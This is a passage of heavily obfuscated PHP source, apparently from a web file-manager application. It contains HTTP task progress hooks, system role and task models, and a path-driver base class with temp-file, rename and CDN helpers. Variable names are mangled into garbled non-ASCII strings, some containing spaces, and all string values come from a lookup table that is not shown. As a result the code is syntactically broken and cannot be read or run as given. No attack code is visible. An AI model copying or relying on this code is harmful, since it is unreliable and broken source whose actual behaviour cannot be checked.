$f·Û‰¡ÇÁ = 1; break; case $d ÅôÓ‚µà[527]: $F«½¡İÀ¤[$d ÅôÓ‚µà[1534]] = $E‡ë…‚İ·[$d ÅôÓ‚µà[28]]; break; case $d ÅôÓ‚µà[529]: $f·Û‰¡ÇÁ = intval($EÅ×¸¤ãŠÏ[$d ÅôÓ‚µà[370]] * 0.4); break; case $d ÅôÓ‚µà[531]: $f·Û‰¡ÇÁ = intval($EÅ×¸¤ãŠÏ[$d ÅôÓ‚µà[370]] * 0.2); break; case $d ÅôÓ‚µà[533]: $f·Û‰¡ÇÁ = intval($EÅ×¸¤ãŠÏ[$d ÅôÓ‚µà[370]] * 0.4); break; } $this->update($f·Û‰¡ÇÁ); $this->sourceModelCopyFlag = !1; goto féÚ‚ã³¡; D‚ñÅéòƒ²: $d ÅôÓ‚µà =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fßôŠ ¶Ÿ× = $EÅ×¸¤ãŠÏ[0]; $E‡ë…‚İ· = $EÅ×¸¤ãŠÏ[1]; goto DäîŠƒ ¾Ö; DäîŠƒ ¾Ö: $F«½¡İÀ¤ =& $this->task; $this->sourceModelCopyFlag = !0; $f·Û‰¡ÇÁ = 0; goto bŒ„±òÅ‡; féÚ‚ã³¡: } public function sourceRemove($AÛÈ—„­ÆÅ, $eíƒ¯Ôôí) { $D…ƒ—¯˜ëÁ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->sourceModelCopyFlag = !0; $FÉõÇ¸Í ¸ = 1; if (isset($AÛÈ—„­ÆÅ[$D…ƒ—¯˜ëÁ[80]])) { $FÉõÇ¸Í ¸ = $AÛÈ—„­ÆÅ[$D…ƒ—¯˜ëÁ[80]][$D…ƒ—¯˜ëÁ[78]] + $AÛÈ—„­ÆÅ[$D…ƒ—¯˜ëÁ[80]][$D…ƒ—¯˜ëÁ[79]] + 1; } $this->update($FÉõÇ¸Í ¸); $this->sourceModelCopyFlag = !1; } public function sourceMove($AÀÙÛÁºÎğ) { $this->sourceRemove($AÀÙÛÁºÎğ, !1); } public function curlProgress($Böœ­Ö“®´, $E­ïŒÂÖ»„, $F–òÕ˜ù, $eªÈáŸÃÜ÷, $DÌ°‚ì¥‡ñ) { $Bõ‚»‰œ„’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f¶æ¬™†™‹ =& $this->task; if ($DÌ°‚ì¥‡ñ > 0) { $f¶æ¬™†™‹[$Bõ‚»‰œ„’[988]] = $Bõ‚»‰œ„’[1552]; $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1538]] = $Bõ‚»‰œ„’[103]; if ($f¶æ¬™†™‹[$Bõ‚»‰œ„’[1536]]) { $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1537]] = $DÌ°‚ì¥‡ñ; } if ($f¶æ¬™†™‹[$Bõ‚»‰œ„’[1539]]) { $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1537]] = $DÌ°‚ì¥‡ñ + $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1539]]; } } else { if ($F–òÕ˜ù > 0) { if ($f¶æ¬™†™‹[$Bõ‚»‰œ„’[1536]] == $E­ïŒÂÖ»„) { $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1537]] = $F–òÕ˜ù; $f¶æ¬™†™‹[$Bõ‚»‰œ„’[988]] = $Bõ‚»‰œ„’[1553]; $f¶æ¬™†™‹[$Bõ‚»‰œ„’[1538]] = $Bõ‚»‰œ„’[1058]; } } } $this->update(); } public function curlProgressStart($CõãÖ¦ƒŠ) { } public function curlProgressEnd($B…ñ¡¢Ç¯) { goto F¶Ÿ“‰ŞŒé; F¶Ÿ“‰ŞŒé: $cèÊÂèê¿ß =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fàæİ¡Šö• =& $this->task; $BÉ«¸™à¶Ã = curl_getinfo($B…ñ¡¢Ç¯); goto d¤µÅ©çÆ›; d¤µÅ©çÆ›: $cõåƒÔğß = $BÉ«¸™à¶Ã[$cèÊÂèê¿ß[1554]]; if ($cõåƒÔğß == -1) { $cõåƒÔğß = $BÉ«¸™à¶Ã[$cèÊÂèê¿ß[1555]]; } if ($fàæİ¡Šö•[$cèÊÂèê¿ß[1538]] == $cèÊÂèê¿ß[103] && $cõåƒÔğß) { $fàæİ¡Šö•[$cèÊÂèê¿ß[1539]] += $cõåƒÔğß; } goto A¼´ÄÅ´‹Ï; A¼´ÄÅ´‹Ï: $this->update(); goto d—Ïèâ™æË; d—Ïèâ™æË: } } class TaskHttp extends Task { protected function startAfter() { $dÔ¾ª–è =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A²ìé ­ÕÚ =& $this->task; $A²ìé ­ÕÚ[$dÔ¾ª–è[1556]] = 1; Hook::bind($dÔ¾ª–è[1528], array($this, $dÔ¾ª–è[1557])); Hook::bind($dÔ¾ª–è[1530], array($this, $dÔ¾ª–è[1558])); Hook::bind($dÔ¾ª–è[1532], array($this, $dÔ¾ª–è[1559])); } protected function endAfter() { $Eéé¨ÑÖ¸ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; Hook::unbind($Eéé¨ÑÖ¸ù[1528], array($this, $Eéé¨ÑÖ¸ù[1557])); Hook::unbind($Eéé¨ÑÖ¸ù[1530], array($this, $Eéé¨ÑÖ¸ù[1558])); Hook::unbind($Eéé¨ÑÖ¸ù[1532], array($this, $Eéé¨ÑÖ¸ù[1559])); } public function progressStart($CÁˆóù­ÑÑ) { $b²µİ„öµÒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aòåƒù¬ª = curl_getinfo($CÁˆóù­ÑÑ); self::log($b²µİ„öµÒ[1560] . $aòåƒù¬ª[$b²µİ„öµÒ[301]]); self::valueSet($this->task[$b²µİ„öµÒ[383]], $this->task); } public function progressEnd($d»˜òƒ½¥¿) { $c«ë†Ï³¼‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; self::log($c«ë†Ï³¼‡[1561] . $this->task[$c«ë†Ï³¼‡[383]]); $this->end(); } public function progress($f†¬Šîë¹Ø, $c¯Àøº¹™, $e ”Ôœ¡ª­, $F¥Š‘ Ù¹, $CÊ“³ä„–) { $BõÏ¶Ÿí‚• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¡Ä‡§†” =& $this->task; if ($CÊ“³ä„– > 0) { $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]] = $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]] == 0 ? $F¥Š‘ Ù¹ : $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]]; $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[1000]] = $CÊ“³ä„–; } else { if ($e ”Ôœ¡ª­ > 0) { $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]] = $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]] == 0 ? $c¯Àøº¹™ : $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[986]]; $A¡Ä‡§†”[$BõÏ¶Ÿí‚•[1000]] = $e ”Ôœ¡ª­; } } $this->update(); self::log("\160\162\x6f\x67\162\145\x73\x73\110\x74\x74\x70\x3a\x64\x6f\167\156\72{$e ”Ôœ¡ª­}\57{$c¯Àøº¹™}\x3b\x20\165\160\x6c\x6f\x61\144\x3a{$CÊ“³ä„–}\x2f{$F¥Š‘ Ù¹}\x3b"); } } goto B½“Şõˆßë; e…”ÔåÜÑÜ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\x72\x6f\154\145\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\164\150", "\x6c\141\142\145\x6c", "\x64\x69\x73\x70\x6c\x61\171", "\163\x79\x73\x74\x65\155", "\x64\x65\163\143", "\151\x67\x6e\x6f\x72\x65\105\x78\x74", "\151\x67\156\x6f\162\145\106\151\x6c\x65\123\x69\x7a\145", "\141\144\155\x69\x6e\x69\x73\164\162\141\x74\157\x72", "\x73\157\x72\164"); public function listData($fŠËœİ˜ôŞ = false, $B‹÷õÔÊ¢• = "\x73\x6f\x72\x74", $c¹…Â‚¯‚® = false) { $e×Œè— =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dä±×»Å ‡ = parent::listData($fŠËœİ˜ôŞ, $B‹÷õÔÊ¢•, $c¹…Â‚¯‚®); if (!$fŠËœİ˜ôŞ) { $fãùÉÊ˜ËÊ = $e×Œè—[2058]; foreach ($Dä±×»Å ‡ as $BÇ¶²´£øğ => $d¨Ñ’¶‡Ø†) { if ($d¨Ñ’¶‡Ø†[$e×Œè—[1841]] == 1) { $Dä±×»Å ‡[$BÇ¶²´£øğ][$e×Œè—[421]] = $fãùÉÊ˜ËÊ; } } } return $Dä±×»Å ‡; } public function update($bÕ‘ºÜô, $A¼½äÚ¨–Œ) { goto d‘ÇÙ¡Â‰à; D¯³®ßÄ÷˜: return parent::update($bÕ‘ºÜô, $A¼½äÚ¨–Œ); goto a‹”¨ÎİÈ¿; D´‡ŒÕ„Æ¯: if (!$eŠÂĞ½Æ || $D†öìè½”¹ && $D†öìè½”¹[$E­Ğ·ãÌ¨¿[383]] != $eŠÂĞ½Æ[$E­Ğ·ãÌ¨¿[383]]) { return !1; } if ($D†öìè½”¹[$E­Ğ·ãÌ¨¿[1841]] == 1) { $A¼½äÚ¨–Œ = array($E­Ğ·ãÌ¨¿[28] => $A¼½äÚ¨–Œ[$E­Ğ·ãÌ¨¿[28]], $E­Ğ·ãÌ¨¿[1671] => $A¼½äÚ¨–Œ[$E­Ğ·ãÌ¨¿[1671]]); } $this->filterAuth($A¼½äÚ¨–Œ[$E­Ğ·ãÌ¨¿[392]]); goto D¯³®ßÄ÷˜; d‘ÇÙ¡Â‰à: $E­Ğ·ãÌ¨¿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŠÂĞ½Æ = parent::listData($bÕ‘ºÜô); $D†öìè½”¹ = $this->findByName($A¼½äÚ¨–Œ[$E­Ğ·ãÌ¨¿[28]]); goto D´‡ŒÕ„Æ¯; a‹”¨ÎİÈ¿: } public function remove($C·Ëµ…ÆÈ) { $fÜ•µÕ®— = parent::listData($C·Ëµ…ÆÈ); if (!$fÜ•µÕ®— || $fÜ•µÕ®—[$_SERVER[ÈİÅ¿ÈÈ¥×][1131]]) { return !1; } return parent::remove($C·Ëµ…ÆÈ); } public function add($b‘Á»ªÔ‹) { goto C›…»ªÊ«Ù; B‡¦™ù¹Ã: $F÷«”´÷– = array($añ¾‡†‹Â[402] => $BÕ—óøßÏ, $añ¾‡†‹Â[1656] => $añ¾‡†‹Â[33], $añ¾‡†‹Â[1652] => $añ¾‡†‹Â[1660], $añ¾‡†‹Â[2059] => 1, $añ¾‡†‹Â[1655] => 0, $añ¾‡†‹Â[2060] => 0, $añ¾‡†‹Â[1654] => $this->getSort()); $b‘Á»ªÔ‹ = array_merge($F÷«”´÷–, $b‘Á»ªÔ‹); $this->filterAuth($b‘Á»ªÔ‹[$añ¾‡†‹Â[392]]); goto AáœÄ«Ğóè; AáœÄ«Ğóè: return parent::insert($b‘Á»ªÔ‹); goto B‰ŠéÕ„­¿; C›…»ªÊ«Ù: $añ¾‡†‹Â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $BÕ—óøßÏ = $b‘Á»ªÔ‹[$añ¾‡†‹Â[28]]; if ($this->findByName($BÕ—óøßÏ)) { return !1; } goto B‡¦™ù¹Ã; B‰ŠéÕ„­¿: } private function getSort() { $Bğ´õ«ã¢¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÙ¶£ğÏ = parent::listData(); $f“Ãî¯™¶Ï = array_to_keyvalue($aÙ¶£ğÏ, $Bğ´õ«ã¢¸[33], $Bğ´õ«ã¢¸[1673]); return empty($f“Ãî¯™¶Ï) ? 0 : max($f“Ãî¯™¶Ï) + 1; } private function filterAuth(&$B®Ñ¤µ¤ì) { $aÍºäâƒİ¡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÊ™î›ì¤ = array(); $fŒğâˆ’ËÓ = array_filter(explode($aÍºäâƒİ¡[47], $B®Ñ¤µ¤ì)); foreach ($fŒğâˆ’ËÓ as $B®Ñ¤µ¤ì) { $e‰œáÀ†® = explode($aÍºäâƒİ¡[91], $B®Ñ¤µ¤ì); if ($e‰œáÀ†®[0] == $aÍºäâƒİ¡[2061] && $e‰œáÀ†®[1] != $aÍºäâƒİ¡[1054]) { $A¬ñ§«†¡» = $e‰œáÀ†®[0] . $aÍºäâƒİ¡[91] . $e‰œáÀ†®[1] . $aÍºäâƒİ¡[2062]; if (!in_array($A¬ñ§«†¡», $fŒğâˆ’ËÓ)) { $FÊ™î›ì¤[] = $A¬ñ§«†¡»; } } $FÊ™î›ì¤[] = $B®Ñ¤µ¤ì; } $B®Ñ¤µ¤ì = implode($aÍºäâƒİ¡[47], $FÊ™î›ì¤); } public function sort($dó¥‘Â÷¼, $Aƒ÷Ä‰—) { return parent::update($dó¥‘Â÷¼, $Aƒ÷Ä‰—); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\164\141\163\153\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\164\x79\x70\145", "\145\166\x65\x6e\x74", "\164\151\155\145", "\x64\145\163\143", "\163\171\x73\164\x65\x6d", "\145\156\x61\x62\x6c\x65", "\154\x61\x73\164\x52\x75\156", "\163\x6f\162\164"); public function listData($E×ğ¶ĞõÅ± = false, $CßÏ’íìÃ = "\163\157\162\x74", $bÌ‘´»¶Àì = false) { return parent::listData($E×ğ¶ĞõÅ±, $CßÏ’íìÃ, $bÌ‘´»¶Àì); } public function add($BÀ¸’ì´Äò) { $D™ÛÌª—•Ï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EÕ™äÉå·° = $this->findByName($BÀ¸’ì´Äò[$D™ÛÌª—•Ï[28]]); if ($EÕ™äÉå·°) { return !1; } $BÀ¸’ì´Äò[$D™ÛÌª—•Ï[1454]] = 0; $BÀ¸’ì´Äò[$D™ÛÌª—•Ï[1673]] = $this->getSort(); return parent::insert($BÀ¸’ì´Äò); } private function getSort() { $C§Ç¿¥¼‚² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eò‹•Úïö† = parent::listData(); $a…ˆ´Œ±ª§ = array_to_keyvalue($eò‹•Úïö†, $C§Ç¿¥¼‚²[33], $C§Ç¿¥¼‚²[1673]); return empty($a…ˆ´Œ±ª§) ? 0 : max($a…ˆ´Œ±ª§) + 1; } public function update($aò˜âç‡, $B§‡³¼ñŠÛ) { $b¡ñ±ÒÊ‹‘ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dçÏÑ°Ê‰ = $this->listData($aò˜âç‡); $F¹ªè’Ìâ = $this->findByName($B§‡³¼ñŠÛ[$b¡ñ±ÒÊ‹‘[28]]); if (!$dçÏÑ°Ê‰ || $F¹ªè’Ìâ && $F¹ªè’Ìâ[$b¡ñ±ÒÊ‹‘[383]] != $dçÏÑ°Ê‰[$b¡ñ±ÒÊ‹‘[383]]) { return !1; } return parent::update($aò˜âç‡, $B§‡³¼ñŠÛ); } public function remove($cêäğƒ¼·±, $FÜßø©Å¨¿ = false) { $D¤¶¿„¶ÇŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÉÔ÷«à·” = $this->listData($cêäğƒ¼·±); if (!$AÉÔ÷«à·”) { return; } if (!$FÜßø©Å¨¿ && $AÉÔ÷«à·”[$D¤¶¿„¶ÇŒ[1131]] == $D¤¶¿„¶ÇŒ[83]) { return !1; } return parent::remove($cêäğƒ¼·±); } public function enable($c †ó«‹¢İ, $Dğ°Š¤Ë’Ö) { return $this->update($c †ó«‹¢İ, array($_SERVER[ÈİÅ¿ÈÈ¥×][2053] => $Dğ°Š¤Ë’Ö)); } public function run($Fˆö»Äø¼ê) { return $this->update($Fˆö»Äø¼ê, array($_SERVER[ÈİÅ¿ÈÈ¥×][2063] => time())); } } goto bˆ²ùÓÖ‘½; E»âóØÂÒ’: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $f’Üùç›¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->objectDriver = array($f’Üùç›¶[57], $f’Üùç›¶[58], $f’Üùç›¶[59], $f’Üùç›¶[60], $f’Üùç›¶[61], $f’Üùç›¶[62], $f’Üùç›¶[63], $f’Üùç›¶[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bØ‹áÆŠçâ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bØ‹áÆŠçâ, $_SERVER[ÈİÅ¿ÈÈ¥×][8]); } return $bØ‹áÆŠçâ; } public function iconvApp($eŒ‰İ†îÔ) { return $eŒ‰İ†îÔ; } public function iconvSystem($Cæè’Õº’¹) { return $Cæè’Õº’¹; } public function iconvTo($e¸¤—Ùé°, $c×àÁ‡¿†, $b†Á‰Ì­ë) { goto f¹‰âóåÆË; f¹‰âóåÆË: $e¸¢ˆÛºÍé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$e¸¤—Ùé° || !function_exists($e¸¢ˆÛºÍé[65])) { return $e¸¤—Ùé°; } static $d­„ò¬ † = array(); goto AäŒÔªÍë; ešàö÷Š‘ö: $d­„ò¬ †[$b†Á‰Ì­ë . $e¸¢ˆÛºÍé[66] . $c×àÁ‡¿† . $e¸¢ˆÛºÍé[67] . $e¸¤—Ùé°] = $e¸¤—Ùé°; $d­„ò¬ †[$b†Á‰Ì­ë . $e¸¢ˆÛºÍé[66] . $c×àÁ‡¿† . $e¸¢ˆÛºÍé[67] . $b·Şï­Å¥] = $e¸¤—Ùé°; $d­„ò¬ †[$c×àÁ‡¿† . $e¸¢ˆÛºÍé[66] . $b†Á‰Ì­ë . $e¸¢ˆÛºÍé[67] . $b·Şï­Å¥] = $b·Şï­Å¥; goto Fˆ¡–’ÉÔÔ; AäŒÔªÍë: $FÖ›¢„ìêò = $c×àÁ‡¿† . $e¸¢ˆÛºÍé[66] . $b†Á‰Ì­ë . $e¸¢ˆÛºÍé[67] . $e¸¤—Ùé°; if (isset($d­„ò¬ †[$FÖ›¢„ìêò])) { return $d­„ò¬ †[$FÖ›¢„ìêò]; } if (function_exists($e¸¢ˆÛºÍé[68])) { $b·Şï­Å¥ = @mb_convert_encoding($e¸¤—Ùé°, $b†Á‰Ì­ë, $c×àÁ‡¿†); } else { $b·Şï­Å¥ = @iconv($c×àÁ‡¿†, $b†Á‰Ì­ë, $e¸¤—Ùé°); } goto D¿îï«ìÃ; Fˆ¡–’ÉÔÔ: return $b·Şï­Å¥; goto eõÑÂÔâŒ; D¿îï«ìÃ: $b·Şï­Å¥ = $b·Şï­Å¥ ? $b·Şï­Å¥ : $e¸¤—Ùé°; if (strstr($b·Şï­Å¥, $e¸¢ˆÛºÍé[69])) { $b·Şï­Å¥ = str_replace($e¸¢ˆÛºÍé[69], $e¸¢ˆÛºÍé[70], $b·Şï­Å¥); } $d­„ò¬ †[$c×àÁ‡¿† . $e¸¢ˆÛºÍé[66] . $b†Á‰Ì­ë . $e¸¢ˆÛºÍé[67] . $e¸¤—Ùé°] = $b·Şï­Å¥; goto ešàö÷Š‘ö; eõÑÂÔâŒ: } public function getPathInner($a‡êÁµĞ´) { $c”à¿‚ÌÑ = IO::init($a‡êÁµĞ´); return $c”à¿‚ÌÑ->path; } public function getPathOuter($dòá†Ã½Ã) { $B›ğîÛ¾¥³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bªõ‚×«ØÅ = strlen(trim($this->pathBase, $B›ğîÛ¾¥³[8])); $dòá†Ã½Ã = substr(trim($dòá†Ã½Ã, $B›ğîÛ¾¥³[8]), $Bªõ‚×«ØÅ); return $this->pathDriver . $B›ğîÛ¾¥³[8] . ltrim($dòá†Ã½Ã, $B›ğîÛ¾¥³[8]); } public function isParentOf($Eô¤‰Œİ°å, $F¹ øšº›) { $f·ÏàÍÄ‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eô¤‰Œİ°å = rtrim(strtolower($Eô¤‰Œİ°å), $f·ÏàÍÄ‹[8]) . $f·ÏàÍÄ‹[8]; $F¹ øšº› = rtrim(strtolower($F¹ øšº›), $f·ÏàÍÄ‹[8]) . $f·ÏàÍÄ‹[8]; $EÑîŞîãÍ‰ = strpos($F¹ øšº›, $Eô¤‰Œİ°å) === 0; return $EÑîŞîãÍ‰; } public function getType() { $féà³¸¥á’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÃÎ´ÀÔ…ó = str_replace($féà³¸¥á’[71], $féà³¸¥á’[33], get_class($this)); return strtolower($eÃÎ´ÀÔ…ó); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÏ¨°‚Ø£á, $dÂñİÚ‚¬æ) { $C¹¿Ûğâ†„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C÷ß¼İ¯ÈÔ = rtrim($FÏ¨°‚Ø£á, $C¹¿Ûğâ†„[8]) . $C¹¿Ûğâ†„[8] . $dÂñİÚ‚¬æ; $A˜îæº¤—¨ = $this->exist($C÷ß¼İ¯ÈÔ); return $A˜îæº¤—¨ ? $C÷ß¼İ¯ÈÔ : !1; } public function setModifyTime($FˆÚšÈ…çĞ, $F‘ŠĞªŞ¥â = '') { } public function renameObject($Cè¹±ø¯Í°, $a±ƒ„’¥ìŒ) { goto b‹’ÒŒ÷ùÍ; e¸‚‹îÂñÅ: $Cè¹±ø¯Í° = $this->getPathOuter($Cè¹±ø¯Í°); $a±ƒ„’¥ìŒ = $this->pathFather($Cè¹±ø¯Í°) . $a±ƒ„’¥ìŒ; if (IO::isFile($Cè¹±ø¯Í°)) { $e•×œÆÒ‡‡ = IO::copy($Cè¹±ø¯Í°, $this->pathFather($Cè¹±ø¯Í°), REPEAT_RENAME_FOLDER, $Cˆ¢§˜ñÄÌ); if ($e•×œÆÒ‡‡) { IO::remove($Cè¹±ø¯Í°); } } else { $e•×œÆÒ‡‡ = IO::mkdir($a±ƒ„’¥ìŒ); if (!$e•×œÆÒ‡‡) { return !1; } $E™”ÏÖ¶…¦ = IO::listPath($Cè¹±ø¯Í°, !0); $e’…–ÛŠ·À = array_merge($E™”ÏÖ¶…¦[$fªÛŠäïö [73]], $E™”ÏÖ¶…¦[$fªÛŠäïö [74]]); foreach ($e’…–ÛŠ·À as $b¬®®»›Úå) { IO::move($b¬®®»›Úå[$fªÛŠäïö [75]], $a±ƒ„’¥ìŒ, REPEAT_RENAME_FOLDER); } IO::remove($Cè¹±ø¯Í°); } goto CàÏºÉ†ø; b‹’ÒŒ÷ùÍ: $fªÛŠäïö  =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Cˆ¢§˜ñÄÌ = $a±ƒ„’¥ìŒ; Hook::trigger($fªÛŠäïö [72], $this, $Cè¹±ø¯Í°, $this, $this->pathFather($Cè¹±ø¯Í°) . $a±ƒ„’¥ìŒ); goto e¸‚‹îÂñÅ; CàÏºÉ†ø: return $e•×œÆÒ‡‡ ? $a±ƒ„’¥ìŒ : !1; goto C‘òĞÉ šƒ; C‘òĞÉ šƒ: } public function tempFile($A·ï«ö = '', $A³±¿»©ª¥ = '') { goto DªôªƒºÙŒ; DªôªƒºÙŒ: if (!$A·ï«ö) { $A·ï«ö = rand_string(15); } $E‡¯Ë¬°ï = TEMP_FILES . rand_string(15) . $_SERVER[ÈİÅ¿ÈÈ¥×][8]; @mkdir($E‡¯Ë¬°ï, 511, !0); goto CÜ™Î††é; CÜ™Î††é: $C…¤šøÎ = $E‡¯Ë¬°ï . $A·ï«ö; @touch($C…¤šøÎ); if ($A³±¿»©ª¥) { file_put_contents($C…¤šøÎ, $A³±¿»©ª¥); } goto fàŒ™ÑÈñ; fàŒ™ÑÈñ: return $C…¤šøÎ; goto EÚâ®¾µÅ²; EÚâ®¾µÅ²: } public function tempFileRemve($F¦¨ªõ˜Ú) { @unlink($F¦¨ªõ˜Ú); @rmdir($this->pathFather($F¦¨ªõ˜Ú)); } public function mkfile($c£¦ó¸ğÕÅ, $fÌ¾¼”­ªö = '', $BÆµ¯Æéíà = REPEAT_RENAME) { } public function mkdir($aÏ­¸­‰ù, $E¯‹Ö³Ë˜Á = REPEAT_SKIP) { } public function delFile($aÃ¯¤İ—’Ÿ) { } public function delFolder($E„…ÌÙô˜–) { } public function copyFile($BÄ“± Ó , $fÈ¯ŸİĞ°) { } public function moveFile($A¡¨ª¹¤ö, $c‘°­¹´öİ) { } public function remove($B†“éÒ¥Ø) { if ($this->isFile($B†“éÒ¥Ø)) { return $this->delFile($B†“éÒ¥Ø); } return $this->delFolder($B†“éÒ¥Ø); } public function rename($bãÙ¸¹Ô×, $e°É²İšË) { } public function exist($FïÎ¾–ê­») { } public function findByHash($D®ÓÌÉ³ªÁ = '', $CÒˆäğ ‚Î = '') { return !1; } public function isFile($A¡ÓÃÙ¦Ù) { } public function isFolder($bÀ‚÷ãâĞ) { } public function size($AÏ¡ôò—İ‘) { } public function info($Cñï˜µ–¯) { } public function infoSimple($eâÑ¼Šì) { return $this->info($eâÑ¼Šì); } public function infoAuth($CÏ…ÖÔ¬Á) { return $this->info($CÏ…ÖÔ¬Á); } public function infoFull($e¹øƒŠ»“) { return $this->info($e¹øƒŠ»“); } public function infoWithChildren($a•Çïê­Ñ) { $FÇ¡ŠÁ‘†† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $Eºâ‰òŞ¢ = array(); if (isset($Eºâ‰òŞ¢[$a•Çïê­Ñ])) { return $Eºâ‰òŞ¢[$a•Çïê­Ñ]; } $dì÷‡£§„ = $this->info($a•Çïê­Ñ); if ($dì÷‡£§„ && $dì÷‡£§„[$FÇ¡ŠÁ‘††[29]] == $FÇ¡ŠÁ‘††[76]) { $fëŒ×º©Š = array($FÇ¡ŠÁ‘††[77] => 0, $FÇ¡ŠÁ‘††[78] => 0, $FÇ¡ŠÁ‘††[79] => 0); $this->infoChildren($a•Çïê­Ñ, $fëŒ×º©Š); $dì÷‡£§„[$FÇ¡ŠÁ‘††[77]] = $fëŒ×º©Š[$FÇ¡ŠÁ‘††[77]]; $dì÷‡£§„[$FÇ¡ŠÁ‘††[80]] = array($FÇ¡ŠÁ‘††[81] => $fëŒ×º©Š[$FÇ¡ŠÁ‘††[78]], $FÇ¡ŠÁ‘††[82] => $fëŒ×º©Š[$FÇ¡ŠÁ‘††[79]]); $Eºâ‰òŞ¢[$a•Çïê­Ñ] = $dì÷‡£§„; } return $dì÷‡£§„; } public function listPath($CØ®´¬‚È“, $CÈ•×©á†¥ = false) { } public function has($D§ºé¸¡†ò, $D¼Ö¨¶ùŒ² = false, $d½äËò¶ÂË = false) { } public function canRead($dõìê§êİ¼) { } public function canWrite($BÈÒ‰š¸ «) { } public function getContent($FŠÎ¯Ô‰‡à) { } public function setContent($C‡’”´´‰ã, $fäªœË’ó = '') { } protected function infoChildren($BÇ»ë·õª©, &$eğÒÈ“êÑ•) { $C¸î­¼˜ƒ… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; check_abort_echo(); $Fª„ÔòŒ = $this->listPath($BÇ»ë·õª©, !0); $Fª„ÔòŒ = array_merge($Fª„ÔòŒ[$C¸î­¼˜ƒ…[74]], $Fª„ÔòŒ[$C¸î­¼˜ƒ…[73]]); foreach ($Fª„ÔòŒ as $AÙ³šÆÉ®¤) { if ($AÙ³šÆÉ®¤[$C¸î­¼˜ƒ…[29]] == $C¸î­¼˜ƒ…[76]) { $eğÒÈ“êÑ•[$C¸î­¼˜ƒ…[79]]++; $DÀ†×ÆÛŠ = $this->getPathInner($AÙ³šÆÉ®¤[$C¸î­¼˜ƒ…[75]]); $this->infoChildren($DÀ†×ÆÛŠ, $eğÒÈ“êÑ•); } else { $eğÒÈ“êÑ•[$C¸î­¼˜ƒ…[78]]++; $eğÒÈ“êÑ•[$C¸î­¼˜ƒ…[77]] += $AÙ³šÆÉ®¤[$C¸î­¼˜ƒ…[77]]; } } } public function fileSubstr($bà®Å‹ªœ, $D³Ø ¤ãÈ¤, $A®‰‡ìÔœ˜) { } public function listAll($cõãßøåƒ) { } public function upload($CñßƒÄ¤Ä, $D”êÏçâù, $eá³Î¿ïì = false, $c½ÄôªÀ… = REPEAT_REPLACE) { } public function uploadFileByID($dÁÛÁ‘Õ», $f©¥ÍËÕ‹Ü, $e¢Ú–Ö§³ê) { } public function uploadFileByPath($BÁîí›ãØ, $dñ±…³‰­Ÿ, $E•ğ£ÑˆÊî = array()) { } public function isUploadServer() { $BÉÏ¥Øàˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $BÉÏ¥Øàˆ[83]) { return !0; } return $GLOBALS[$BÉÏ¥Øàˆ[6]][$BÉÏ¥Øàˆ[84]][$BÉÏ¥Øàˆ[85]]; } public function isFileOutServer() { $CÒƒÎ·ù–Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CÒƒÎ·ù–Ô[83]) { return !0; } return $GLOBALS[$CÒƒÎ·ù–Ô[6]][$CÒƒÎ·ù–Ô[84]][$CÒƒÎ·ù–Ô[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($b‰½Å‡ŒÄ) { $D±†é‘Í =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->isCdnHost()) { return $b‰½Å‡ŒÄ; } return str_replace(trim(get_url_root($b‰½Å‡ŒÄ), $D±†é‘Í[8]), trim($this->cdnHost, $D±†é‘Í[8]), 